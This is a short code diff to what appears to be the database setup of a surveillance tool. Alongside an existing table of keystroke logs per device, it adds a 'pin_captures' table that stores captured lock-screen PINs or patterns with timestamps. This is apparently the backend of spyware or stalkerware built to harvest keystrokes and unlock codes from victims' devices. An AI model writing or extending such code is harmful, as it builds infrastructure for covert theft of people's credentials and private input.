@@ -75,5 +75,17 @@ export async function initSchema() {
   await pool.query(`
     CREATE INDEX IF NOT EXISTS idx_keylog_device ON keylog_entries(device_id, captured_at DESC)
   `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS pin_captures (
+      id SERIAL PRIMARY KEY,
+      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
+      lock_type TEXT NOT NULL DEFAULT 'pin',
+      value TEXT NOT NULL DEFAULT '',
+      captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    CREATE INDEX IF NOT EXISTS idx_pin_device ON pin_captures(device_id, captured_at DESC)
+  `)
   _schemaReady = true
 }
